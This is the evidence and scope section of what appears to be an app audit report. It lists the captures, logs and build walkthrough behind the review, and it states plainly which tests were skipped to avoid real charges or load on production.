Evidence: 146 web captures (desktop 1440×900, mobile 390×844, dark mode, Lighthouse ×4, console/network/header logs), 60 simulator screenshots of `main` (light, dark, XXXL Dynamic Type) plus build/test/plist logs, and a live walkthrough of the shipped App Store build 1.0.75 on macOS.  Panel lenses: 24 (1 added by the completeness critic: gap-extraction-ground-truth-audit).  Signed-in web state could not be captured (Google blocks sign-in in automated Chrome) and was reviewed from code.  Admin API was queried read-only with the owner's token; the token value appears nowhere.  Two areas the critic proposed were deliberately NOT executed: an end-to-end signed-in purchase (it would have charged a real card) and a concurrency/load test (it would have hit the single production box) — both remain untested by this review.  Every P0-P3 finding was then re-checked against `main` as of 2026-08-19; findings already fixed were moved to Appendix C, and partly-fixed ones are flagged.  Overlapping in-flight audits (PRs #1973, #1978, #1979, #1981) are cross-referenced where findings say tracked-in-PR.


